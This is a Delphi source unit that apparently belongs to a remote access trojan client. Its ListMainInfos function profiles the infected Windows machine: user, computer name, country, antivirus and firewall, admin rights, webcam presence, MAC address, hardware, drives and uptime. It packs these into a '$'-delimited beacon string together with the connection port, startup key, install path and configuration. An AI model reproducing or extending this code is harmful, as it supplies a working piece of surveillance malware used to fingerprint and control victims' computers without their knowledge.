unit UnitInformations;

interface

uses
  Windows, SysUtils, ShellAPI, Nb30, UnitConstants, UnitFunctions, UnitAntivirus,
  UnitConfiguration, UnitCaptureFunctions, UnitFilesManager;

function ListMainInfos: string;
function ResMonitor: string;
Function UserType: string;

implementation

uses
  UnitVariables;
        
type
  TSystemMem = (smTotalPhys, smAvailPhys);
               
  SYSTEM_BASIC_INFORMATION = packed record
    dwUnknown1              : DWORD;
    uKeMaximumIncrement     : ULONG;
    uPageSize               : ULONG;
    uMmNumberOfPhysicalPages: ULONG;
    uMmLowestPhysicalPage   : ULONG;
    uMmHighestPhysicalPage  : ULONG;
    uAllocationGranularity  : ULONG;
    pLowestUserAddress      : POINTER;
    pMmHighestUserAddress   : POINTER;
    uKeActiveProcessors     : POINTER;
    bKeNumberProcessors     : BYTE;
    bUnknown2               : BYTE;
    wUnknown3               : WORD;
  end;

  SYSTEM_PERFORMANCE_INFORMATION = packed record
    nIdleTime               : INT64;
    dwSpare                 : array[0..75]of DWORD;
  end;

  SYSTEM_TIME_INFORMATION = packed record
    nKeBootTime             : INT64;
    nKeSystemTime           : INT64;
    nExpTimeZoneBias        : INT64;
    uCurrentTimeZoneId      : ULONG;
    dwReserved              : DWORD;
  end;

  function NTQuerySystemInformation(SystemInformationClass: Longint;
    SystemInformation: Pointer; SystemInformationLength: Longint;
    ReturnLength: Longint): Longint; stdcall; external 'ntdll.dll' name 'NtQuerySystemInformation';

var
  IsNTAdmin: function(dwReserved: LongInt; lpdwReserved: LongInt): LongInt; stdcall;
  nOldIdleTime: Int64 = 0;
  nOldSystemTime : INT64 = 0;
  nNewCPUTime    : ULONG = 0;

const
  SYS_BASIC_INFO            = 0;
  SYS_PERFORMANCE_INFO      = 2;
  SYS_TIME_INFO             = 3;

function GetComputer: string;
var
  TmpStr: array[0..255] of Char;
  Size: DWORD;
begin
  Result := 'Unknown';
  Size := 256;
  if GetComputerName(TmpStr, Size) then Result := TmpStr;
end;

function GetUser: string;
var
  TmpStr: array[0..255] of Char;
  Size: DWORD;
begin
  Result := 'Unknown';
  Size := 256;
  if GetUserName(TmpStr, Size) then Result := TmpStr;
end;
 
function GetLanguage: string;
var
  Buffer: array [0..255] of char ;
begin
  GetLocaleInfo(LOCALE_USER_DEFAULT, LOCALE_SNATIVELANGNAME, Buffer, SizeOf(Buffer));
  Result := Buffer;
end;

function xGetCountry :string;
var
  Buffer: array[0..4] of Char;
begin
  GetLocaleInfo(LOCALE_USER_DEFAULT, LOCALE_SISO3166CTRYNAME, Buffer, SizeOf(Buffer));
  Result := PChar(@Buffer[0]);
end;
               
function GetUptime: String;
var
  Tiempo, Dias, Horas, Minutos, Secondos: Cardinal;
begin
  Result := '';
 	Tiempo := GetTickCount();
  Dias   := Tiempo div (1000 * 60 * 60 * 24);
  Tiempo := Tiempo - Dias * (1000 * 60 * 60 * 24);
  Horas  := Tiempo div (1000 * 60 * 60);
  Tiempo := Tiempo - Horas * (1000 * 60 * 60);
  Minutos:= Tiempo div (1000 *60);
  Tiempo := Tiempo - Minutos * (1000 * 60);
  Secondos := Tiempo div (1000);
  Result := IntToStr(Dias) + 'd ' + IntToStr(Horas) + 'h ' + IntToStr(Minutos) + 'm ' + IntToStr(Secondos) + 's';
end;
                     
function ScreenRes: string;
begin
  Result := inttostr(GetSystemMetrics(SM_CXSCREEN)) + 'x' + inttostr(GetSystemMetrics(SM_CYSCREEN));
end;

Function UserType: string;
begin
  result := 'Unknown';
  if @IsNTAdmin = nil then
  begin
    LoadLibrary('advpack');
    @IsNTAdmin := GetProcAddress(getmodulehandle('advpack'),'IsNTAdmin');
  end;
  if @IsNTAdmin = nil then exit;
  if IsNTAdmin(0, 0) <> 0 then Result := 'Administrator' else Result := 'Limited';
end;

function CPUName: string;
begin
  Result := ReadKeyString(HKEY_LOCAL_MACHINE, 'HARDWARE\DESCRIPTION\System\CentralProcessor\0', 'ProcessorNameString', '');
  Result := MegaTrim(Result);
end;
      
function CPUArchType: string;
begin
  Result := ReadKeyString(HKEY_LOCAL_MACHINE, 'HARDWARE\DESCRIPTION\System\CentralProcessor\0', 'Identifier', '');
  if Pos('x86', Result) > 0 then Result := 'x86' else Result := 'x64';
end;

function GPU: string;  //Original function from delphiabout.com
var
  lpDisplayDevice: TDisplayDevice;
begin
  lpDisplayDevice.cb := SizeOf(lpDisplayDevice);
  Result := '-';
  if not EnumDisplayDevices(nil, 0, lpDisplayDevice , 0) then Exit;
  Result := lpDisplayDevice.DeviceString
end;

function GetRAMSize(aSystemMem: TSystemMem): int64;
type
  // Record for more than 2 gb RAM.
  TMemoryStatusEx = packed record
    dwLength: DWORD;
    dwMemoryLoad: DWORD;
    ullTotalPhys: int64;
    ullAvailPhys: int64;
    ullTotalPageFile: int64;
    ullAvailPageFile: int64;
    ullTotalVirtual: int64;
    ullAvailVirtual: int64;
    ullAvailExtendedVirtual: int64;
  end;
  // Function for more than 2 gb RAM (function available in Win2000+).
  PFNGlobalMemoryStatusEx = function(var lpBuffer: TMemoryStatusEx): BOOL;
    stdcall;
var
  P: Pointer;
  GlobalMemoryStatusEx: PFNGlobalMemoryStatusEx;
  CFGDLLHandle: THandle;
  MemoryStatusEx: TMemoryStatusEx; // Win2000+
  MemoryStatus: TMemoryStatus; // Win9x
  nResult: int64;
begin
  nResult := -1;
  GlobalMemoryStatusEx := nil;
  // Load library dynamicly if exists.
  CFGDLLHandle := LoadLibrary('kernel32.dll');
  if (CFGDLLHandle <> 0) then
  begin
    P := GetProcAddress(CFGDLLHandle, 'GlobalMemoryStatusEx');
    if (P = nil) then
    begin
      FreeLibrary(CFGDLLHandle);
      CFGDLLHandle := 0;
    end
    else
      GlobalMemoryStatusEx := PFNGlobalMemoryStatusEx(P);
  end;
  if (@GlobalMemoryStatusEx <> nil) then
  begin
    ZeroMemory(@MemoryStatusEx, sizeof(TMemoryStatusEx));
    MemoryStatusEx.dwLength := sizeof(TMemoryStatusEx);
    GlobalMemoryStatusEx(MemoryStatusEx);
    case aSystemMem of
      smTotalPhys:
        nResult := MemoryStatusEx.ullTotalPhys;
      smAvailPhys:
        nResult := MemoryStatusEx.ullAvailPhys;
    end;
    FreeLibrary(CFGDLLHandle);
  end;
  // "Old" method if library is not available.
  if nResult = -1 then
  begin
    with MemoryStatus do
    begin
      dwLength := sizeof(TMemoryStatus);
      windows.GlobalMemoryStatus(MemoryStatus);
      case aSystemMem of
        smTotalPhys:
          nResult := dwTotalPhys;
        smAvailPhys:
          nResult := dwAvailPhys;
      end;
    end;
  end;
  Result := nResult;
end;
        
function GetMACAdress: string;
var
  NCB: PNCB;
  Adapter: PAdapterStatus;
  URetCode: PChar;
  RetCode: char;
  I: integer;
  Lenum: PlanaEnum;
  _SystemID: string;
  TMPSTR: string;
begin
  Result    := '';
  _SystemID := '';
  Getmem(NCB, SizeOf(TNCB));
  Fillchar(NCB^, SizeOf(TNCB), 0);
  Getmem(Lenum, SizeOf(TLanaEnum));
  Fillchar(Lenum^, SizeOf(TLanaEnum), 0);
  Getmem(Adapter, SizeOf(TAdapterStatus));
  Fillchar(Adapter^, SizeOf(TAdapterStatus), 0);
  Lenum.Length    := chr(0);
  NCB.ncb_command := chr(NCBENUM);
  NCB.ncb_buffer  := Pointer(Lenum);
  NCB.ncb_length  := SizeOf(Lenum);
  RetCode         := Netbios(NCB);

  i := 0;
  repeat
    Fillchar(NCB^, SizeOf(TNCB), 0);
    Ncb.ncb_command  := chr(NCBRESET);
    Ncb.ncb_lana_num := lenum.lana[I];
    RetCode          := Netbios(Ncb);
    Fillchar(NCB^, SizeOf(TNCB), 0);
    Ncb.ncb_command  := chr(NCBASTAT);
    Ncb.ncb_lana_num := lenum.lana[I];
    // Must be 16
    Ncb.ncb_callname := '*               ';
    Ncb.ncb_buffer := Pointer(Adapter);
    Ncb.ncb_length := SizeOf(TAdapterStatus);
    RetCode        := Netbios(Ncb);
    //---- calc _systemId from mac-address[2-5] XOR mac-address[1]...
    if (RetCode = chr(0)) or (RetCode = chr(6)) then
    begin
      _SystemId := IntToHex(Ord(Adapter.adapter_address[0]), 2) + '-' +
        IntToHex(Ord(Adapter.adapter_address[1]), 2) + '-' +
        IntToHex(Ord(Adapter.adapter_address[2]), 2) + '-' +
        IntToHex(Ord(Adapter.adapter_address[3]), 2) + '-' +
        IntToHex(Ord(Adapter.adapter_address[4]), 2) + '-' +
        IntToHex(Ord(Adapter.adapter_address[5]), 2);
    end;
    
    Inc(i);
  until (I >= Ord(Lenum.Length)) or (_SystemID <> '00-00-00-00-00-00');

  FreeMem(NCB);
  FreeMem(Adapter);
  FreeMem(Lenum);
  GetMacAdress := _SystemID;
end;
            
function WebcamInstalled: string;
  function CheckWebcamDrivers: Boolean;
  var
    dName, dVer: array[0..MAX_PATH] of Char;
  begin
    Result := capGetDriverDescription(0, @dName, SizeOf(dName), @dVer, SizeOf(dVer));
  end;
begin
  if CheckWebcamDrivers then Result := 'Installed' else Result := 'Not installed'
end;

function RegInfos(Subkey: string; Name: string): string;
begin
  Result := '';
  Result := ReadKeyString(HKEY_LOCAL_MACHINE, PChar(Subkey), PChar(Name), '');
end;

function RAMUsage: Integer;
begin
  Result := Round(((GetRAMSize(smTotalPhys) - GetRAMSize(smAvailPhys)) / GetRAMSize(smTotalPhys)) * 100);
end;

function GetAntivirus: string;
var
  Sec: TSecurityCenterInfo;
begin
  Sec := TSecurityCenterInfo.Create;
  GetSecInfo(AntiVirusProduct, Sec);
  Result := Sec.displayName;
  if Result = '' then Result := '-' else
  Delete(Result, LastDelimiter(Result, ','), Length(Result));
  Sec.Free;
end;
      
function GetFirewall: string;
var
  Sec: TSecurityCenterInfo;
begin
  Sec := TSecurityCenterInfo.Create;
  GetSecInfo(FirewallProduct, Sec);
  Result := Sec.displayName;
  if Result = '' then Result := '-' else
  Delete(Result, LastDelimiter(Result, ','), Length(Result));
  Sec.Free;
end;
   
function CPUUsage: Int64;
var
  spi : SYSTEM_PERFORMANCE_INFORMATION;
  sti : SYSTEM_TIME_INFORMATION;
  sbi : SYSTEM_BASIC_INFORMATION;
begin
  if (NTQuerySystemInformation(SYS_BASIC_INFO, @sbi, sizeof(SYSTEM_BASIC_INFORMATION), 0) = NO_ERROR) then
  begin
    if (NTQuerySystemInformation(SYS_TIME_INFO, @sti, sizeof(SYSTEM_TIME_INFORMATION), 0) = NO_ERROR) then
    if (NTQuerySystemInformation(SYS_PERFORMANCE_INFO, @spi, sizeof(SYSTEM_PERFORMANCE_INFORMATION), 0)= NO_ERROR) then
    begin
      if (nOldIdleTime <> 0) then
      begin
        nNewCPUTime:= trunc(100-((spi.nIdleTime-nOldIdleTime)/(sti.nKeSystemTime-nOldSystemTime)*100)/sbi.bKeNumberProcessors+0.5);
        if (nNewCPUTime <> nOldIdleTime) then Result := nNewCPUTIME;
      end;
      nOldIdleTime   := spi.nIdleTime;
      nOldSystemTime := sti.nKeSystemTime;
    end;
  end;
end;

function ResMonitor: string;
begin
  Result := IntToStr(CPUUsage) + '|' + IntToStr(RAMUsage);
end;
       
function Is64BitOS: Boolean;
type
  TIsWow64Process = function(Handle:THandle; var IsWow64 : BOOL) : BOOL; stdcall;
var
  hKernel32 : Integer;
  IsWow64Process: TIsWow64Process;
  IsWow64: BOOL;
begin
  Result := False;
  hKernel32 := LoadLibrary('kernel32.dll');
  if (hKernel32 = 0) then Exit;
  @IsWow64Process := GetProcAddress(hkernel32, 'IsWow64Process');
  if Assigned(IsWow64Process) then
  begin
    IsWow64 := False;
    if (IsWow64Process(GetCurrentProcess, IsWow64)) then Result := IsWow64 else Exit;
  end;               
  
  FreeLibrary(hKernel32);
end;
   
function OSArchType: string;
begin
  if Is64BitOS then Result := ' 64 bits' else Result := ' 32 bits';
end;

function ListMainInfos: string;
begin
  Result := xGetCountry + '$' + NewGroup + '$' + NewIdentification + '$' + GetUser + '$' +
    GetComputer + '$' + RegInfos('SOFTWARE\Microsoft\Windows NT\CurrentVersion\', 'ProductName') + OSArchType + '$' +
    GetAntivirus + '$' + UserType + '$' + WebcamInstalled + '$' + LocalAddress + '$' +
    IntToStr(MainConnection.RemotePort) + '$' + InstalledDate + '$' + ScreenRes + '$' +
    IntToStr(GetCurrentProcessId) + '$' + _Foldername + '$' + _FileName + '$' +
    _StartupKey + '$' + GetLanguage + '$' + RootDir + '$' + SysDir + '$' + GetFirewall + '$' +
    CPUName + '$' + IntToStr(GetRAMSize(smTotalPhys)) + '$' +
    DateToStr(Date) + ' ' + TimeToStr(Time) + '$' + GetUptime + '$' + GetMACAdress + '$' +
    GetBrowser + '$' + RegInfos('HARDWARE\DESCRIPTION\System\BIOS\', 'BIOSVendor') + '$' +
    RegInfos('HARDWARE\DESCRIPTION\System\BIOS\', 'BIOSVersion') + '$' + ActiveCaption + '$' +
    ClientPath + '$' + PROGRAMVERSIONNUMBER + '$' + CPUArchType + '$' + ListDrives + '$' +
    GPU + '$' + GenerateConfig + '$';
end;

end.

